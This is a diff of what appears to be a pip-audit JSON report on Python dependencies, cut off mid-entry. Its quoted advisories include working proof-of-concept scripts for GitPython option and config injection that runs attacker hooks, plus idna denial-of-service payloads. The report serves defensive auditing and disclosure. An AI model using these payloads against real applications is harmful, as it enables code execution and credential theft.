@@ -1,48 +1,1086 @@
 {
   "dependencies": [
     {
-      "name": "requests",
-      "version": "2.28.1",
+      "name": "altair",
+      "version": "6.0.0",
+      "vulns": []
+    },
+    {
+      "name": "annotated-doc",
+      "version": "0.0.4",
+      "vulns": []
+    },
+    {
+      "name": "annotated-types",
+      "version": "0.7.0",
+      "vulns": []
+    },
+    {
+      "name": "anyio",
+      "version": "4.13.0",
+      "vulns": []
+    },
+    {
+      "name": "attrs",
+      "version": "26.1.0",
+      "vulns": []
+    },
+    {
+      "name": "authlib",
+      "version": "1.7.2",
+      "vulns": []
+    },
+    {
+      "name": "bandit",
+      "version": "1.9.4",
+      "vulns": []
+    },
+    {
+      "name": "blinker",
+      "version": "1.9.0",
+      "vulns": []
+    },
+    {
+      "name": "boltons",
+      "version": "21.0.0",
+      "vulns": []
+    },
+    {
+      "name": "boolean-py",
+      "version": "5.0",
+      "vulns": []
+    },
+    {
+      "name": "bracex",
+      "version": "2.6",
+      "vulns": []
+    },
+    {
+      "name": "cachecontrol",
+      "version": "0.14.4",
+      "vulns": []
+    },
+    {
+      "name": "cachetools",
+      "version": "7.0.5",
+      "vulns": []
+    },
+    {
+      "name": "certifi",
+      "version": "2026.2.25",
+      "vulns": []
+    },
+    {
+      "name": "cffi",
+      "version": "2.0.0",
+      "vulns": []
+    },
+    {
+      "name": "charset-normalizer",
+      "version": "3.4.6",
+      "vulns": []
+    },
+    {
+      "name": "click",
+      "version": "8.4.1",
+      "vulns": []
+    },
+    {
+      "name": "click-option-group",
+      "version": "0.5.9",
+      "vulns": []
+    },
+    {
+      "name": "colorama",
+      "version": "0.4.6",
+      "vulns": []
+    },
+    {
+      "name": "cryptography",
+      "version": "46.0.6",
       "vulns": [
         {
-          "id": "CVE-2023-32681",
-          "fix_versions": ["2.31.0"],
-          "description": "Vulnerabilidade relacionada a redirecionamento inseguro."
+          "id": "PYSEC-2026-36",
+          "fix_versions": [
+            "46.0.7"
+          ],
+          "aliases": [
+            "GHSA-p423-j2cm-9vmq",
+            "CVE-2026-39892"
+          ],
+          "description": "If a non-contiguous buffer was passed to APIs which accepted Python buffers (e.g. `Hash.update()`), this could lead to buffer overflows. For example:  ```python h = Hash(SHA256()) b.update(buf[::-1]) ```  would read past the end of the buffer on Python >3.11"
+        },
+        {
+          "id": "PYSEC-2026-36",
+          "fix_versions": [
+            "46.0.7"
+          ],
+          "aliases": [
+            "GHSA-p423-j2cm-9vmq",
+            "CVE-2026-39892"
+          ],
+          "description": "cryptography is a package designed to expose cryptographic primitives and recipes to Python developers. From 45.0.0 to before 46.0.7, if a non-contiguous buffer was passed to APIs which accepted Python buffers (e.g. Hash.update()), this could lead to buffer overflows. This vulnerability is fixed in 46.0.7."
         }
       ]
     },
     {
-      "name": "urllib3",
-      "version": "1.26.5",
+      "name": "cyclonedx-python-lib",
+      "version": "11.7.0",
+      "vulns": []
+    },
+    {
+      "name": "defusedxml",
+      "version": "0.7.1",
+      "vulns": []
+    },
+    {
+      "name": "distro",
+      "version": "1.9.0",
+      "vulns": []
+    },
+    {
+      "name": "dparse",
+      "version": "0.6.4",
+      "vulns": []
+    },
+    {
+      "name": "exceptiongroup",
+      "version": "1.2.2",
+      "vulns": []
+    },
+    {
+      "name": "face",
+      "version": "26.0.0",
+      "vulns": []
+    },
+    {
+      "name": "filelock",
+      "version": "3.29.0",
+      "vulns": []
+    },
+    {
+      "name": "gitdb",
+      "version": "4.0.12",
+      "vulns": []
+    },
+    {
+      "name": "gitpython",
+      "version": "3.1.46",
       "vulns": [
         {
-          "id": "CVE-2023-43804",
-          "fix_versions": ["2.0.6"],
-          "description": "Possível bypass TLS em conexões inseguras."
+          "id": "CVE-2026-42215",
+          "fix_versions": [
+            "3.1.47"
+          ],
+          "aliases": [
+            "GHSA-rpm5-65cw-6hj4"
+          ],
+          "description": "### Summary GitPython blocks dangerous Git options such as `--upload-pack` and `--receive-pack` by default, but the equivalent Python kwargs `upload_pack` and `receive_pack` bypass that check. If an application passes attacker-controlled kwargs into `Repo.clone_from()`, `Remote.fetch()`, `Remote.pull()`, or `Remote.push()`, this leads to arbitrary command execution even when `allow_unsafe_options` is left at its default value of `False`.  ### Details GitPython explicitly treats helper-command options as unsafe because they can be used to execute arbitrary commands:  - `git/repo/base.py:145-153` marks clone options such as `--upload-pack`, `-u`, `--config`, and `-c` as unsafe. - `git/remote.py:535-548` marks fetch/pull/push options such as `--upload-pack`, `--receive-pack`, and `--exec` as unsafe.  The vulnerable API paths check the raw kwarg names before they're its normalized into command-line flags:  - `Repo.clone_from()` checks `list(kwargs.keys())` in `git/repo/base.py:1387-1390` - `Remote.fetch()` checks `list(kwargs.keys())` in `git/remote.py:1070-1071` - `Remote.pull()` checks `list(kwargs.keys())` in `git/remote.py:1124-1125` - `Remote.push()` checks `list(kwargs.keys())` in `git/remote.py:1197-1198`  That validation is performed by `Git.check_unsafe_options()` in `git/cmd.py:948-961`. The validator correctly blocks option names such as `upload-pack`, `receive-pack`, and `exec`.  Later, GitPython converts Python kwargs into Git command-line flags in `Git.transform_kwarg()` at `git/cmd.py:1471-1484`. During that step, underscore-form kwargs are dashified:  - `upload_pack=...` becomes `--upload-pack=...` - `receive_pack=...` becomes `--receive-pack=...`  Because the unsafe-option check runs before this normalization, underscore-form kwargs bypass the safety check even though they become the exact dangerous Git flags that the code is supposed to reject.  In practice:  - `remote.fetch(**{\"upload-pack\": helper})` is blocked with `UnsafeOptionError` - `remote.fetch(upload_pack=helper)` is allowed and reaches helper execution  The same bypass works for:  ```python Repo.clone_from(origin, out, upload_pack=helper) repo.remote(\"origin\").fetch(upload_pack=helper) repo.remote(\"origin\").pull(upload_pack=helper) repo.remote(\"origin\").push(receive_pack=helper) ```  This does not appear to affect every unsafe option. For example, `exec=` is already rejected because the raw kwarg name `exec` matches the blocked option name before normalization.  Existing tests cover the hyphenated form, not the vulnerable underscore form. For example:  - `test/test_clone.py:129-136` checks `{\"upload-pack\": ...}` - `test/test_remote.py:830-833` checks `{\"upload-pack\": ...}` - `test/test_remote.py:968-975` checks `{\"receive-pack\": ...}`  Those tests correctly confirm the literal Git option names are blocked, but they do not exercise the normal Python kwarg spelling that bypasses the guard.  ### PoC 1. Create and activate a virtual environment in the repository root:  ```bash python3 -m venv .venv-sec .venv-sec/bin/pip install setuptools gitdb source ./.venv-sec/bin/activate ```  2. make a new python file and put the following in there, then run it:  ```python import os import stat import subprocess import tempfile  from git import Repo from git.exc import UnsafeOptionError  # Setup: create isolated repositories so the PoC uses a normal fetch flow. base = tempfile.mkdtemp(prefix=\"gp-poc-risk-\") origin = os.path.join(base, \"origin.git\") producer = os.path.join(base, \"producer\") victim = os.path.join(base, \"victim\") proof = os.path.join(base, \"proof.txt\") wrapper = os.path.join(base, \"wrapper.sh\")  # Setup: this wrapper is just to demo things you can do, not required for the exploit to work # you could also do something like an SSH reverse shell, really anything with open(wrapper, \"w\") as f:     f.write(f\"\"\"#!/bin/sh {{   echo \"code_exec=1\"   echo \"whoami=$(id)\"   echo \"cwd=$(pwd)\"   echo \"uname=$(uname -a)\"   printf 'argv='; printf '<%s>' \"$@\"; echo   env | grep -E '^(HOME|USER|PATH|SSH_AUTH_SOCK|CI|GITHUB_TOKEN|AWS_|AZURE_|GOOGLE_)=' | sed 's/=.*$/=<redacted>/' || true }} > '{proof}' exec git-upload-pack \"$@\" \"\"\") os.chmod(wrapper, stat.S_IRWXU)  subprocess.run([\"git\", \"init\", \"--bare\", origin], check=True, stdout=subprocess.DEVNULL) subprocess.run([\"git\", \"clone\", origin, producer], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  with open(os.path.join(producer, \"README\"), \"w\") as f:     f.write(\"x\")  subprocess.run([\"git\", \"-C\", producer, \"add\", \"README\"], check=True, stdout=subprocess.DEVNULL) subprocess.run(     [\"git\", \"-C\", producer, \"-c\", \"user.name=t\", \"-c\", \"user.email=t@t\", \"commit\", \"-m\", \"init\"],     check=True,     stdout=subprocess.DEVNULL, ) subprocess.run([\"git\", \"-C\", producer, \"push\", \"origin\", \"HEAD\"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) subprocess.run([\"git\", \"clone\", origin, victim], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  repo = Repo(victim) remote = repo.remote(\"origin\")  # the literal Git option name is properly blocked. try:     remote.fetch(**{\"upload-pack\": wrapper})     print(\"control=unexpected_success\") except UnsafeOptionError:     print(\"control=blocked\")  # this is the actual vulnerability # you can also just do upload_pack=\"touch /tmp/proof\", the wrapper is just to show greater impact # if you do the \"touch /tmp/proof\" the script will crash, but the file will have been created remote.fetch(upload_pack=wrapper)  # Proof: the helper ran as the GitPython host process. print(\"proof_exists\", os.path.exists(proof), proof) print(open(proof).read()) ```  3. Expected result:  - The script prints `control=blocked` - The script prints `proof_exists True ...` - The proof file contains evidence that the attacker-controlled helper executed as the local application account, including `id`, working directory, argv, and selected environment variable names  Example output:  ```bash GitPython % python3 test.py control=blocked proof_exists True /var/folders/p4/kldmq4m13nd19dhy7lxs4jfw0000gn/T/gp-poc-risk-a1oftfku/proof.txt code_exec=1 whoami=uid=501(wes) gid=20(staff) <redacted> cwd=/private/var/folders/p4/kldmq4m13nd19dhy7lxs4jfw0000gn/T/gp-poc-risk-a1oftfku/victim uname=Darwin  <redacted> Darwin Kernel Version  <redacted>; root:xnu-11417. <redacted> argv=</var/folders/p4/kldmq4m13nd19dhy7lxs4jfw0000gn/T/gp-poc-risk-a1oftfku/origin.git> USER=<redacted> SSH_AUTH_SOCK=<redacted> PATH=<redacted> HOME=<redacted> ```  This PoC does not require a malicious repository. The PoC uses that fresh blank repository. The only attacker-controlled input is the kwarg that GitPython turns into `--upload-pack`.  ### Impact Who is impacted: - Web applications that let users configure repository import, sync, mirroring, fetch, pull, or push behavior - Systems that accept a user-provided dict of \"extra Git options\" and pass it into GitPython with `**kwargs` - CI/CD systems, workers, automation bots, or internal tools that build GitPython calls from untrusted integration settings or job definitions (yaml, json, etc configs )  What the attacker needs to control:  - A value that becomes `upload_pack` or `receive_pack` in the kwargs passed to `Repo.clone_from()`, `Remote.fetch()`, `Remote.pull()`, or `Remote.push()`  From a severity perspective, this could lead to - Theft of SSH keys, deploy credentials, API tokens, or cloud credentials available to the process - Modification of repositories, build outputs, or release artifacts - Lateral movement from CI/CD workers or automation hosts - Full compromise of the worker or service process handling repository operations  The highest-risk environments are network-reachable services and automation systems that expose these GitPython kwargs across a trust boundary while relying on the default unsafe-option guard for protection."
+        },
+        {
+          "id": "CVE-2026-42284",
+          "fix_versions": [
+            "3.1.47"
+          ],
+          "aliases": [
+            "GHSA-x2qx-6953-8485"
+          ],
+          "description": "### Summary  `_clone()` validates `multi_options` as the original list, then executes `shlex.split(\" \".join(multi_options))`. A string like `\"--branch main --config core.hooksPath=/x\"` passes validation (starts with `--branch`), but after split becomes `[\"--branch\", \"main\", \"--config\", \"core.hooksPath=/x\"]`. Git applies the config and executes attacker hooks during clone.  ### Details  The vulnerable code is in [`git/repo/base.py` line 1383](https://github.com/gitpython-developers/GitPython/blob/5937d14a2c5e532fcb3ece0f45bf75e5bf18539e/git/repo/base.py#L1383): ```python multi = shlex.split(\" \".join(multi_options)) ```  Then validation runs on the **original** list at [line 1390](https://github.com/gitpython-developers/GitPython/blob/5937d14a2c5e532fcb3ece0f45bf75e5bf18539e/git/repo/base.py#L1390): ```python Git.check_unsafe_options(options=multi_options, unsafe_options=cls.unsafe_git_clone_options) ```  Then execution uses the **transformed** result at [line 1392](https://github.com/gitpython-developers/GitPython/blob/5937d14a2c5e532fcb3ece0f45bf75e5bf18539e/git/repo/base.py#L1392): ```python proc = git.clone(multi, \"--\", url, path, ...) ```  The [check at `git/cmd.py` line 959](https://github.com/gitpython-developers/GitPython/blob/5937d14a2c5e532fcb3ece0f45bf75e5bf18539e/git/cmd.py#L959) uses `startswith`: ```python if option.startswith(unsafe_option) or option == bare_option: ```  `\"--branch main --config ...\"` does not start with `\"--config\"`, so it passes. After `shlex.split`, `\"--config\"` becomes its own token and reaches git.  Also affects `Submodule.update()` via `clone_multi_options`.  ### PoC  ```python import sys, pathlib, subprocess sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))  from git import Repo from git.exc import UnsafeOptionError  try:     Repo.clone_from(\"/nonexistent\", \"/tmp/x\", multi_options=[\"--config\", \"core.hooksPath=/x\"]) except UnsafeOptionError:     print(\"multi_options=['--config', '...']: Block as expected\") except Exception:     pass  DIR = pathlib.Path(__file__).resolve().parent / \"workdir_b\" SRC = DIR / \"repo\" DST = DIR / \"dst\" HOOKS = DIR / \"hooks\" LOG = DIR / \"output.log\"  if not SRC.exists():     SRC.mkdir(parents=True)     r = lambda *a: subprocess.run(a, cwd=SRC, capture_output=True)     r(\"git\", \"init\", \"-b\", \"main\")     (SRC / \"f\").write_text(\"x\\n\")     r(\"git\", \"add\", \".\")     r(\"git\", \"commit\", \"-m\", \"init\")  HOOKS.mkdir(exist_ok=True) hook = HOOKS / \"post-checkout\" hook.write_text(f\"#!/bin/sh\\nwhoami > {LOG.as_posix()}\\nhostname >> {LOG.as_posix()}\\n\") hook.chmod(0o755)  LOG.unlink(missing_ok=True) payload = \"--branch main --config core.hooksPath=\" + HOOKS.as_posix()  try:     Repo.clone_from(str(SRC), str(DST), multi_options=[payload]) except UnsafeOptionError:     print(f\"multi_options=['{payload}']: BLOCKED\"); sys.exit(1) except Exception:     pass  if not LOG.exists() and DST.exists():     subprocess.run([\"git\", \"checkout\", \"--force\", \"main\"], cwd=DST, capture_output=True)  print(f\"multi_options=['{payload}']: not blocked\") print(f\"\\nHook executed: {LOG.exists()}\") if LOG.exists():     print(LOG.read_text().strip()) ```  **Output:** ``` multi_options=['--config', '...']: Block as expected multi_options=['--branch main --config core.hooksPath=.../hooks']: not blocked  Hook executed: True texugo DESKTOP-5w5HH79 ```  ### Impact  Any application passing user input to `multi_options` in `clone_from()`, `clone()`, or `Submodule.update()` is vulnerable. Attacker embeds `--config core.hooksPath=<dir>` inside a string starting with a safe option. Check does not block it. Git executes attacker code. Same class as CVE-2023-40267."
+        },
+        {
+          "id": "CVE-2026-44244",
+          "fix_versions": [
+            "3.1.49"
+          ],
+          "aliases": [
+            "GHSA-v87r-6q3f-2j67"
+          ],
+          "description": "`GitConfigParser.set_value()` passes values to Python's `configparser` without validating for newlines. GitPython's own `_write()` converts embedded newlines into indented continuation lines (e.g. `\\n` becomes `\\n\\t`), but Git still accepts an indented `[core]` stanza as a section header — so the injected `core.hooksPath` becomes effective configuration. Any Git operation that invokes hooks (commit, merge, checkout) will then execute scripts from the attacker-controlled path.  The vulnerability is not merely malformed config output: GitPython's own writer converts embedded newlines into indented continuation lines, but Git still accepts an indented `[core]` stanza as a section header, so the injected `core.hooksPath` becomes effective configuration.  This was found while auditing MLRun's `project.push()` method, which passes `author_name` and `author_email` directly to `config_writer().set_value()` with no sanitization. Both parameters cross a trust boundary — they are caller-supplied API inputs that end up in `.git/config`.  PoC (standalone, no MLRun required):  ```python import git, subprocess, os  repo = git.Repo(\"/tmp/testrepo\")  with repo.config_writer() as cw:     cw.set_value(\"user\", \"name\", \"foo\\n[core]\\nhooksPath=/tmp/hooks\")  r = subprocess.run([\"git\", \"config\", \"core.hooksPath\"], cwd=\"/tmp/testrepo\", capture_output=True, text=True) assert r.returncode == 0 print(r.stdout.strip())  # /tmp/hooks  os.makedirs(\"/tmp/hooks\", exist_ok=True) open(\"/tmp/hooks/pre-commit\", \"w\").write(\"#!/bin/sh\\nid > /tmp/pwned\\n\") os.chmod(\"/tmp/hooks/pre-commit\", 0o755)  repo.index.add([\"README\"]) repo.git.commit(m=\"test\") print(open(\"/tmp/pwned\").read())  # uid=... ```  Tested on GitPython 3.1.46, git 2.39+.  Impact: This is persistent repo config poisoning. Any user who can supply `author_name` or `author_email` to an application calling `config_writer().set_value()` can redirect Git hook execution to an arbitrary path. In a multi-user or hosted environment (e.g. a shared MLRun server where multiple users push to the same repositories), one user can poison the `.git/config` of a shared repo and have their hooks run in the context of every subsequent Git operation by any user. On single-user deployments, the impact depends on whether the application later invokes Git hooks automatically.  Remediation: `set_value()` should raise on CR, LF, or NUL in values rather than silently pass them through:  ```python import re  if isinstance(value, (str, bytes)) and re.search(r\"[\\r\\n\\x00]\", str(value)):     raise ValueError(\"Git config values must not contain CR, LF, or NUL\") ```  Rejecting is safer than stripping — a stripped newline might indicate the caller is passing unsanitized input at a higher level, and silent normalization masks that.  Affected wherever `config_writer().set_value(section, key, user_input)` is called with external input.** GitPython is a dependency of DVC, MLflow, Kedro, and others — worth auditing their `set_value()` call sites for externally influenced inputs."
+        },
+        {
+          "id": "GHSA-mv93-w799-cj2w",
+          "fix_versions": [
+            "3.1.50"
+          ],
+          "aliases": [],
+          "description": "Summary  The patch for CVE-2026-42215 (GitPython 3.1.49) validates newlines only in the value parameter of set_value(). The section and option parameters are passed to configparser without any newline validation. An attacker who controls the section argument can inject \\n to write arbitrary section headers into .git/config, including a forged [core] section with hooksPath pointing to an attacker-controlled directory, leading to RCE when any git hook is triggered.  Details  File: git/config.py — GitPython 3.1.49 (latest patched version)  ```python   def set_value(self, section: str, option: str, value) -> \"GitConfigParser\":       value_str = self._value_to_string_safe(value)   # only value is validated       if not self.has_section(section):           self.add_section(section)                    # section not validated       super().set(section, option, value_str)          # option not validated       return self ```  _write() formats section headers as \"[%s]\\n\" % name. When section = \"user]\\n[core\", this writes [user]\\n[core]\\n — two valid section headers — into .git/config.  PoC  ```python   import git, os, subprocess    repo = git.Repo.init(\"/tmp/bypass_test\")    os.makedirs(\"/tmp/evil_hooks\", exist_ok=True)   with open(\"/tmp/evil_hooks/pre-commit\", \"w\") as f:       f.write(\"#!/bin/sh\\nid > /tmp/rce_proof.txt\\n\")   os.chmod(\"/tmp/evil_hooks/pre-commit\", 0o755)    # Inject newline into section parameter (not value — already patched)   with repo.config_writer() as cw:       cw.set_value(\"user]\\n[core\", \"hooksPath\", \"/tmp/evil_hooks\")    r = subprocess.run([\"git\", \"-C\", \"/tmp/bypass_test\", \"config\", \"core.hooksPath\"],                      capture_output=True, text=True)   print(r.stdout.strip())  # → /tmp/evil_hooks    subprocess.run([\"git\", \"-C\", \"/tmp/bypass_test\", \"commit\", \"--allow-empty\", \"-m\", \"x\"])   print(open(\"/tmp/rce_proof.txt\").read())  # → uid=1000(...) RCE confirmed ```  Impact  Same attack outcome as CVE-2026-42215 (RCE via core.hooksPath injection). The patch is incomplete — only value is validated while section and option remain injectable."
+        }
+      ]
+    },
+    {
+      "name": "glom",
+      "version": "25.12.0",
+      "vulns": []
+    },
+    {
+      "name": "google-ai-generativelanguage",
+      "version": "0.6.15",
+      "vulns": []
+    },
+    {
+      "name": "google-api-core",
+      "version": "2.30.0",
+      "vulns": []
+    },
+    {
+      "name": "google-api-python-client",
+      "version": "2.193.0",
+      "vulns": []
+    },
+    {
+      "name": "google-auth",
+      "version": "2.49.1",
+      "vulns": []
+    },
+    {
+      "name": "google-auth-httplib2",
+      "version": "0.3.0",
+      "vulns": []
+    },
+    {
+      "name": "google-genai",
+      "version": "1.69.0",
+      "vulns": []
+    },
+    {
+      "name": "googleapis-common-protos",
+      "version": "1.73.1",
+      "vulns": []
+    },
+    {
+      "name": "grpcio",
+      "version": "1.78.0",
+      "vulns": []
+    },
+    {
+      "name": "grpcio-status",
+      "version": "1.71.2",
+      "vulns": []
+    },
+    {
+      "name": "h11",
+      "version": "0.16.0",
+      "vulns": []
+    },
+    {
+      "name": "httpcore",
+      "version": "1.0.9",
+      "vulns": []
+    },
+    {
+      "name": "httplib2",
+      "version": "0.31.2",
+      "vulns": []
+    },
+    {
+      "name": "httpx",
+      "version": "0.28.1",
+      "vulns": []
+    },
+    {
+      "name": "httpx-sse",
+      "version": "0.4.3",
+      "vulns": []
+    },
+    {
+      "name": "idna",
+      "version": "3.11",
+      "vulns": [
+        {
+          "id": "CVE-2026-45409",
+          "fix_versions": [
+            "3.15"
+          ],
+          "aliases": [
+            "GHSA-65pc-fj4g-8rjx"
+          ],
+          "description": "This is the same issue as CVE-2024-3651, however the original remediation in 2024 was not a complete fix. Payloads such as `\"\\u0660\" * N` or `\"\\u30fb\" * N + \"\\u6f22\"` utilize the `valid_contexto` function prior to length rejection, and for high values of `N` will take a long time to process.  ### Impact A specially crafted argument to the `idna.encode()` function could consume significant resources. This may lead to a denial-of-service.  ### Patches Starting in version 3.14, the function rejects long inputs as soon as practicable prior to any further processing to minimize resource consumption. In version 3.15, this approach was extended to lesser used alternate functions (i.e. per-label conversions and codec support).  ### Workarounds Domain names cannot exceed 253 characters in length, if this length limit is enforced prior to passing the domain to the `idna.encode()` function it should no longer consume significant resources. This is triggered by arbitrarily large inputs that would not occur in normal usage, but may be passed to the library assuming there is no preliminary input validation by the higher-level application."
+        }
+      ]
+    },
+    {
+      "name": "importlib-metadata",
+      "version": "8.7.1",
+      "vulns": []
+    },
+    {
+      "name": "jinja2",
+      "version": "3.1.6",
+      "vulns": []
+    },
+    {
+      "name": "joblib",
+      "version": "1.5.3",
+      "vulns": []
+    },
+    {
+      "name": "joserfc",
+      "version": "1.7.1",
+      "vulns": []
+    },
+    {
+      "name": "jsonschema",
+      "version": "4.25.1",
+      "vulns": []
+    },
+    {
+      "name": "jsonschema-specifications",
+      "version": "2025.9.1",
+      "vulns": []
+    },
+    {
+      "name": "license-expression",
+      "version": "30.4.4",
+      "vulns": []
+    },
+    {
+      "name": "markdown-it-py",
+      "version": "4.0.0",
+      "vulns": []
+    },
+    {
+      "name": "markupsafe",
+      "version": "3.0.3",
+      "vulns": []
+    },
+    {
+      "name": "marshmallow",
+      "version": "4.3.0",
+      "vulns": []
+    },
+    {
+      "name": "mcp",
+      "version": "1.23.3",
+      "vulns": []
+    },
+    {
+      "name": "mdurl",
+      "version": "0.1.2",
+      "vulns": []
+    },
+    {
+      "name": "msgpack",
+      "version": "1.1.2",
+      "vulns": []
+    },
+    {
+      "name": "narwhals",
+      "version": "2.18.1",
+      "vulns": []
+    },
+    {
+      "name": "nltk",
+      "version": "3.9.4",
+      "vulns": []
+    },
+    {
+      "name": "numpy",
+      "version": "2.4.3",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-api",
+      "version": "1.37.0",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-exporter-otlp-proto-common",
+      "version": "1.37.0",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-exporter-otlp-proto-http",
+      "version": "1.37.0",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-instrumentation",
+      "version": "0.58b0",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-instrumentation-requests",
+      "version": "0.58b0",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-instrumentation-threading",
+      "version": "0.58b0",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-proto",
+      "version": "1.37.0",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-sdk",
+      "version": "1.37.0",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-semantic-conventions",
+      "version": "0.58b0",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-util-http",
+      "version": "0.58b0",
+      "vulns": []
+    },
+    {
+      "name": "packageurl-python",
+      "version": "0.17.6",
+      "vulns": []
+    },
+    {
+      "name": "packaging",
+      "version": "26.0",
+      "vulns": []
+    },
+    {
+      "name": "pandas",
+      "version": "2.3.3",
+      "vulns": []
+    },
+    {
+      "name": "peewee",
+      "version": "3.19.0",
+      "vulns": []
+    },
+    {
+      "name": "pillow",
+      "version": "12.1.1",
+      "vulns": [
+        {
+          "id": "PYSEC-2026-165",
+          "fix_versions": [
+            "12.2.0"
+          ],
+          "aliases": [
+            "BIT-pillow-2026-42308",
+            "CVE-2026-42308",
+            "GHSA-wjx4-4jcj-g98j"
+          ],
+          "description": "If a font advances for each glyph by an exceeding large amount, when Pillow keeps track of the current position, it may lead to an integer overflow. This has been fixed."
+        },
+        {
+          "id": "PYSEC-2026-165",
+          "fix_versions": [
+            "12.2.0"
+          ],
+          "aliases": [
+            "CVE-2026-42308",
+            "GHSA-wjx4-4jcj-g98j"
+          ],
+          "description": "Pillow is a Python imaging library. Prior to version 12.2.0, if a font advances for each glyph by an exceeding large amount, when Pillow keeps track of the current position, it may lead to an integer overflow. This issue has been patched in version 12.2.0."
+        },
+        {
+          "id": "CVE-2026-40192",
+          "fix_versions": [
+            "12.2.0"
+          ],
+          "aliases": [
+            "BIT-pillow-2026-40192",
+            "GHSA-whj4-6x5x-4v2j"
+          ],
+          "description": "### Impact Pillow did not limit the amount of GZIP-compressed data read when decoding a FITS image, making it vulnerable to decompression bomb attacks. A specially crafted FITS file could cause unbounded memory consumption, leading to denial of service (OOM crash or severe performance degradation).  ### Patches The amount of data read is now limited to the necessary amount. Fixed in Pillow 12.2.0 (PR #9521).  ### Workarounds Avoid Pillow >= 10.3.0, < 12.2.0 Only open [specific image formats](https://pillow.readthedocs.io/en/stable/releasenotes/8.0.0.html#image-open-add-formats-parameter), excluding FITS."
+        },
+        {
+          "id": "CVE-2026-42309",
+          "fix_versions": [
+            "12.2.0"
+          ],
+          "aliases": [
+            "BIT-pillow-2026-42309",
+            "GHSA-5xmw-vc9v-4wf2"
+          ],
+          "description": "Passing nested lists as coordinates to APIs that accept coordinates such as `ImagePath.Path`, `ImageDraw.ImageDraw.polygon` and `ImageDraw.ImageDraw.line` could cause a heap buffer overflow, as nested lists were recursively unpacked beyond the allocated buffer. Coordinate lists are now validated to contain exactly two numeric coordinates. This was introduced in Pillow 11.2.1."
+        },
+        {
+          "id": "CVE-2026-42310",
+          "fix_versions": [
+            "12.2.0"
+          ],
+          "aliases": [
+            "GHSA-r73j-pqj5-w3x7",
+            "BIT-pillow-2026-42310"
+          ],
+          "description": "### Impact An attacker can supply a malicious PDF that causes the process to hang indefinitely, consuming 100% CPU and making the application unresponsive.  ### Patches Patched version: 12.2.0.  PdfParser (introduced in Pillow 4.2.0) follows Prev pointers in PDF trailers to read cross-reference sections. If a trailer's Prev pointer references an offset that has already been processed — either pointing to itself or forming a longer cycle — the parser enters an infinite loop. Pillow now tracks previously processed trailer offsets and raises an error if a cycle is detected.  ### Workarounds Use any version but the affected versions: >= 4.2.0, < 12.2.0  ### Resources  - Fix: https://github.com/python-pillow/Pillow/pull/9519"
+        },
+        {
+          "id": "CVE-2026-42311",
+          "fix_versions": [
+            "12.2.0"
+          ],
+          "aliases": [
+            "GHSA-pwv6-vv43-88gr",
+            "BIT-pillow-2026-42311"
+          ],
+          "description": "### Impact Processing a malicious PSD file could lead to memory corruption, potentially resulting in a crash or arbitrary code execution.  ### Patches Patched version: 12.2.0  Pillow 12.1.1 addressed CVE-2026-25990 by adding checks for tile extents in PSD image decoding/encoding to prevent an out-of-bounds write. However, the bounds checks computed tile extent sums using types susceptible to integer overflow, meaning a PSD image with carefully chosen tile dimensions could produce values that wrap around and bypass the checks, still triggering an out-of-bounds write in src/decode.c and src/encode.c. The fix avoids adding extents together before comparison.  ### Workarounds Use any version but affected versions: >= 10.3.0, < 12.2.0  ### Resources  - Fix: https://github.com/python-pillow/Pillow/pull/9520   - Original issue: CVE-2026-25990 (Pillow 12.1.1)"
+        }
+      ]
+    },
+    {
+      "name": "pip",
+      "version": "26.1.2",
+      "vulns": []
+    },
+    {
+      "name": "pip-api",
+      "version": "0.0.34",
+      "vulns": []
+    },
+    {
+      "name": "pip-audit",
+      "version": "2.10.0",
+      "vulns": []
+    },
+    {
+      "name": "pip-requirements-parser",
+      "version": "32.0.1",
+      "vulns": []
+    },
+    {
+      "name": "platformdirs",
+      "version": "4.9.6",
+      "vulns": []
+    },
+    {
+      "name": "plotly",
+      "version": "6.7.0",
+      "vulns": []
+    },
+    {
+      "name": "proto-plus",
+      "version": "1.27.2",
+      "vulns": []
+    },
+    {
+      "name": "protobuf",
+      "version": "5.29.6",
+      "vulns": []
+    },
+    {
+      "name": "py-serializable",
+      "version": "2.1.0",
+      "vulns": []
+    },
+    {
+      "name": "pyarrow",
+      "version": "23.0.1",
+      "vulns": []
+    },
+    {
+      "name": "pyasn1",
+      "version": "0.6.3",
+      "vulns": []
+    },
+    {
+      "name": "pyasn1-modules",
+      "version": "0.4.2",
+      "vulns": []
+    },
+    {
+      "name": "pycparser",
+      "version": "3.0",
+      "vulns": []
+    },
+    {
+      "name": "pydantic",
+      "version": "2.12.5",
+      "vulns": []
+    },
+    {
+      "name": "pydantic-core",
+      "version": "2.41.5",
+      "vulns": []
+    },
+    {
+      "name": "pydantic-settings",
+      "version": "2.13.1",
+      "vulns": []
+    },
+    {
+      "name": "pydeck",
+      "version": "0.9.1",
+      "vulns": []
+    },
+    {
+      "name": "pygments",
+      "version": "2.19.2",
+      "vulns": [
+        {
+          "id": "CVE-2026-4539",
+          "fix_versions": [
+            "2.20.0"
+          ],
+          "aliases": [
+            "GHSA-5239-wwwm-4pmq"
+          ],
+          "description": "A security flaw has been discovered in pygments before 2.20.0. The impacted element is the function AdlLexer of the file pygments/lexers/archetype.py. The manipulation results in inefficient regular expression complexity. The attack is only possible with local access. The exploit has been released to the public and may be used for attacks. The project was informed of the problem early through an issue report but has not responded yet."
         }
       ]
     },
     {
       "name": "pyjwt",
-      "version": "2.4.0",
+      "version": "2.12.1",
       "vulns": [
         {
-          "id": "JWT-WEAK-ALGORITHM",
-          "fix_versions": ["2.8.0"],
-          "description": "Uso inseguro de algoritmos JWT fracos."
+          "id": "PYSEC-2026-179",
+          "fix_versions": [
+            "2.13.0"
+          ],
+          "aliases": [
+            "CVE-2026-48526",
+            "GHSA-xgmm-8j9v-c9wx"
+          ],
